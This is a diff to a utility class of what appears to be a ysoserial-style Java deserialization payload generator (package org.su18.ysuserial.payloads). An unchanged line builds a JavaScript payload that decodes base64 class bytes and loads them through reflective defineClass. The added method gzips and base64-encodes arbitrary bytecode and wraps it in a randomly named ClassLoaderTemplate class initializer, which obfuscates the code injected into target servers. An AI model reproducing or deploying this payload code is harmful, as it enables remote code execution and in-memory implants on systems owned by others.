@@ -4,13 +4,17 @@ import javassist.CannotCompileException;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.bcel.classfile.Utility;
+import org.apache.commons.codec.binary.Base64;
 
+import java.io.ByteArrayOutputStream;
 import java.io.FileOutputStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
+import java.util.zip.GZIPOutputStream;
 
 import static org.su18.ysuserial.payloads.config.Config.USING_RHINO;
+import static org.su18.ysuserial.payloads.util.ClassNameUtils.generateClassName;
 
 /**
  * @author su18
@@ -113,4 +117,25 @@ public class Utils {
 			return "var data = \"" + base64Encode(classBytes) + "\";var dataBytes=java.util.Base64.getDecoder().decode(data);var cloader= java.lang.Thread.currentThread().getContextClassLoader();var superLoader=cloader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();var method=superLoader.getDeclaredMethod(\"defineClass\",dataBytes.getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);method.setAccessible(true);var memClass=method.invoke(cloader,dataBytes,0,dataBytes.length);memClass.newInstance();";
 		}
 	}
+
+	public static CtClass encapsulationByClassLoaderTemplate(byte[] bytes, String cName, CtClass superClass) throws Exception {
+		ClassPool pool    = ClassPool.getDefault();
+		CtClass   ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
+		ctClass.setName(generateClassName());
+		ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
+		GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
+		gzipOutputStream.write(bytes);
+		gzipOutputStream.close();
+		String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
+		String className = "className=\"" + cName + "\";";
+		ctClass.makeClassInitializer().insertBefore(content);
+		ctClass.makeClassInitializer().insertBefore(className);
+
+		if (superClass != null) {
+			ctClass.setSuperclass(superClass);
+		}
+
+		return ctClass;
+	}
+
 }
